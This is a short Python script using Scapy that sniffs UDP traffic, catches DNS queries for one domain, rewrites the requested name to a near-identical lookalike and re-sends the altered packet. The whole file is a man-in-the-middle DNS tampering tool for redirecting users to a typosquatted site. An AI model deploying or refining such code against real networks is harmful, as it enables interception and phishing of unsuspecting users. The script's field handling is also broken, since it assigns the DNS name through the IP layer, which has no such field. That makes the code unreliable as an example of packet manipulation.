from scapy.all import *

#Callback method of sniff function
def alter_packet(pkt):
    if pkt.haslayer(DNS):   
        if pkt[DNS].qdcount > 0 and str.encode("ouiche.com") in pkt[DNS].qd.qname:
            print("Packet from : " + str(pkt[IP].src) + " -> " + str(pkt[IP].dst))
            print("DNS Request for " + str(pkt[DNS].qd.qname))

            #Alter domain name requested by client
            del pkt[DNS].qd.qname
            pkt[IP].qd.qname = "oulche.com."
            print("Requested domain name changed to : " + str(pkt[IP].qd.qname))

            #Delete length and checksum to let Scapy recalculate it
            del pkt[IP].len
            del pkt[IP].chksum
            del pkt[UDP].len
            del pkt[UDP].chksum

            #Send Altered packet
            sendp(pkt)
    

#Sniff and filter packets
sniff(iface="eth0", filter="udp", prn=alter_packet)